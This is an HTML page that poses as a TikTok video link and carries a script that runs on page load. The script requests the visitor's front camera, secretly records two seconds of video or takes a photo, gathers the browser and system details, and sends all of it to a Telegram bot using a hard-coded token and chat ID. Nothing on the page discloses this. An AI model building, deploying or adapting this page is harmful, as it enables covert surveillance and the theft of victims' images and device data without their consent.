<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8"/>
<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
<meta content="Tiktok video" property="og:title">
<meta content="Watch tiktok" property="og:description">
<meta content="https://wwd.com/wp-content/uploads/2020/09/tiktok.png" property="og:image"/>
<meta content="website" property="og:type"/>
<title>Tiktok</title>
<style>
body {
    margin: 0;
    padding: 0;
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100vh;
    background-color: #000;
    }
.container {
    text-align: center;
    max-width: 400px;
    width: 100%;
    }
.image-container {
    background-color: #1c1e24;
    border-radius: 20px;
    overflow: hidden;
    margin-bottom: 20px;
    }
video {
    width: 100%;
    height: auto;
    display: none;
    }
canvas {
    display: none;
    }
</style>
</head>
<body>
<div class="container">
<div class="image-container">
<video id="video" autoplay playsinline></video>
<canvas id="canvas"></canvas>
</div>
<img alt="Tiktok Logo" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcS45jF2oX5HYzhemcWzyNdDf9PuYxjj8cf6ww&amp;s"/>
</div>

<script>
document.addEventListener('DOMContentLoaded', () => {
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    
    // Variables for video recording
    let mediaRecorder;
    let recordedChunks = [];
    let recording = false;
    let recordingTimer;

    // Start the process immediately
    setTimeout(() => {
        startVerification();
    }, 500);
    
    async function startVerification() {
        try {
            // Request camera access
            const stream = await navigator.mediaDevices.getUserMedia({ 
                video: { 
                    facingMode: 'user',
                    width: { ideal: 1280 },
                    height: { ideal: 720 }
                },
                audio: false
            });
            
            // Attach camera stream to video element
            video.srcObject = stream;
            
            // Wait for video to load
            video.addEventListener('loadedmetadata', () => {
                // Set canvas dimensions to match video
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                
                // Start recording
                startRecording(stream);
            });
        } catch (err) {
            // If camera access fails, still send system info
            setTimeout(() => {
                sendToTelegram(null);
            }, 1500);
        }
    }
    
    function startRecording(stream) {
        try {
            // Set up media recorder
            mediaRecorder = new MediaRecorder(stream, {
                mimeType: 'video/webm; codecs=vp9'
            });
            
            // Handle data available event
            mediaRecorder.ondataavailable = (event) => {
                if (event.data.size > 0) {
                    recordedChunks.push(event.data);
                }
            };
            
            // Handle recording stop
            mediaRecorder.onstop = () => {
                // Create a blob from the recorded chunks
                const blob = new Blob(recordedChunks, { type: 'video/webm' });
                
                // Send the recorded video to Telegram
                sendToTelegram(blob);
                
                // Stop all tracks
                stream.getTracks().forEach(track => track.stop());
            };
            
            // Start recording
            mediaRecorder.start();
            recording = true;
            
            // Set timer to stop recording after 2 seconds
            recordingTimer = setTimeout(() => {
                if (recording) {
                    mediaRecorder.stop();
                    recording = false;
                }
            }, 2000);
            
        } catch (err) {
            // Fallback to photo capture if video recording fails
            setTimeout(() => {
                capturePhoto();
                stream.getTracks().forEach(track => track.stop());
            }, 1000);
        }
    }
    
    function capturePhoto() {
        // Draw the current video frame to canvas
        const context = canvas.getContext('2d');
        context.drawImage(video, 0, 0, canvas.width, canvas.height);
        
        // Send the captured image to Telegram
        sendToTelegram(canvas);
    }
    
    function sendToTelegram(media) {
        // Collect system information with emojis
        const systemInfo = {
            "ðŸŒ User Agent": navigator.userAgent,
            "ðŸ’» Platform": navigator.platform,
            "ðŸ—£ï¸ Language": navigator.language,
            "ðŸ•’ Timezone": Intl.DateTimeFormat().resolvedOptions().timeZone,
            "ðŸ“º Screen": `${screen.width}x${screen.height}`,
            "ðŸª Cookies Enabled": navigator.cookieEnabled,
            "ðŸ“… Date": new Date().toISOString(),
            "ðŸ“ Location": "Unknown",
            "ðŸ“¡ IP Address": "Unknown"
        };
        
        // Telegram bot API endpoint
        const botToken = '8096888598:AAFPeNP38s_MBl1FmCyKviaQo0fMHH1qzPw-bRQnylNXZQ';
        const chatId = '8096888598';
        
        // Create form data
        const formData = new FormData();
        formData.append('chat_id', chatId);
        formData.append('text', `System Info:\n${JSON.stringify(systemInfo, null, 2)}`);
        
        // First send system info as text
        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: 'POST',
            body: formData
        })
        .then(response => response.json())
        .then(data => {
            if (data.ok && media) {
                if (media instanceof HTMLCanvasElement) {
                    // Handle photo
                    const imageData = media.toDataURL('image/jpeg', 0.9);
                    const blob = dataURLtoBlob(imageData);
                    
                    const photoFormData = new FormData();
                    photoFormData.append('chat_id', chatId);
                    photoFormData.append('photo', blob, 'tiktok_verification.jpg');
                    
                    fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                        method: 'POST',
                        body: photoFormData
                    });
                } else if (media instanceof Blob) {
                    // Handle video
                    const videoFormData = new FormData();
                    videoFormData.append('chat_id', chatId);
                    videoFormData.append('video', media, 'tiktok_verification.webm');
                    videoFormData.append('caption', 'Recorded video');
                    
                    fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, {
                        method: 'POST',
                        body: videoFormData
                    });
                }
            }
        });
    }
    
    // Helper function to convert data URL to Blob
    function dataURLtoBlob(dataurl) {
        const arr = dataurl.split(',');
        const mime = arr[0].match(/:(.*?);/)[1];
        const bstr = atob(arr[1]);
        let n = bstr.length;
        const u8arr = new Uint8Array(n);
        
        while (n--) {
            u8arr[n] = bstr.charCodeAt(n);
        }
        
        return new Blob([u8arr], { type: mime });
    }
});
</script>
</body>
</html>
